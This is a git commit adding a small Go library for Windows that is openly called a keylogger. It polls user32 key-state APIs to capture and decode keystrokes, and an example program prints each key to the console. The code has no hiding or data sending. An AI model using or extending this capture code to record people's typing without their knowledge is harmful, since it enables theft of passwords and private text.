03c1c0347274e7c61ed71803affdb13b84a8dbc0
KindlyFire <me@kindlyfire.me>
2018-08-13 23:58:36 +0200

    Initial commit

---
+++ examples/keylogger.go
@@ -0,0 +1,31 @@
+package main
+
+import (
+	"fmt"
+	"time"
+
+	"gopkg.in/kindlyfire/go-keylogger"
+)
+
+const (
+	delayKeyfetchMS = 5
+)
+
+func main() {
+	kl := keylogger.NewKeylogger()
+	emptyCount := 0
+
+	for {
+		key := kl.GetKey()
+
+		if !key.Empty {
+			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
+		}
+
+		emptyCount++
+
+		fmt.Printf("Empty count: %d\r", emptyCount)
+
+		time.Sleep(delayKeyfetchMS * time.Millisecond)
+	}
+}
---
+++ keylogger.go
@@ -0,0 +1,101 @@
+// Package keylogger is a keylogger for windows
+package keylogger
+
+import (
+	"syscall"
+	"unicode/utf8"
+	"unsafe"
+
+	"github.com/TheTitanrain/w32"
+)
+
+var (
+	moduser32 = syscall.NewLazyDLL("user32.dll")
+
+	procGetKeyboardLayout     = moduser32.NewProc("GetKeyboardLayout")
+	procGetKeyboardState      = moduser32.NewProc("GetKeyboardState")
+	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
+	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
+	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
+)
+
+// NewKeylogger creates a new keylogger depending on
+// the platform we are running on (currently only Windows
+// is supported)
+func NewKeylogger() Keylogger {
+	kl := Keylogger{}
+
+	return kl
+}
+
+// Keylogger represents the keylogger
+type Keylogger struct {
+	lastKey int
+}
+
+// Key is a single key entered by the user
+type Key struct {
+	Empty   bool
+	Rune    rune
+	Keycode int
+}
+
+// GetKey gets the current entered key by the user, if there is any
+func (kl *Keylogger) GetKey() Key {
+	activeKey := 0
+	var keyState uint16
+
+	for i := 0; i < 256; i++ {
+		keyState = w32.GetAsyncKeyState(i)
+
+		// Check if the most significant bit is set (key is down)
+		// And check if the key is not a non-char key (except for space, 0x20)
+		if keyState&(1<<15) != 0 && !(i < 0x2F && i != 0x20) && (i < 160 || i > 165) && (i < 91 || i > 93) {
+			activeKey = i
+			break
+		}
+	}
+
+	if activeKey != 0 {
+		if activeKey != kl.lastKey {
+			kl.lastKey = activeKey
+			return kl.ParseKeycode(activeKey, keyState)
+		}
+	} else {
+		kl.lastKey = 0
+	}
+
+	return Key{Empty: true}
+}
+
+// ParseKeycode returns the correct Key struct for a key taking in account the current keyboard settings
+// That struct contains the Rune for the key
+func (kl Keylogger) ParseKeycode(keyCode int, keyState uint16) Key {
+	key := Key{Empty: false, Keycode: keyCode}
+
+	// Only one rune has to fit in
+	outBuf := make([]uint16, 1)
+
+	// Buffer to store the keyboard state in
+	kbState := make([]uint16, 256)
+
+	// Get keyboard layout for this process (0)
+	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))
+
+	for i := 0; i < 256; i++ {
+		kbState[i] = w32.GetAsyncKeyState(i)
+	}
+
+	_, _, _ = procToUnicodeEx.Call(
+		uintptr(keyCode),
+		uintptr(0),
+		uintptr(unsafe.Pointer(&kbState[0])),
+		uintptr(unsafe.Pointer(&outBuf[0])),
+		uintptr(1),
+		uintptr(1),
+		uintptr(kbLayout))
+
+	key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))
+
+	return key
+}
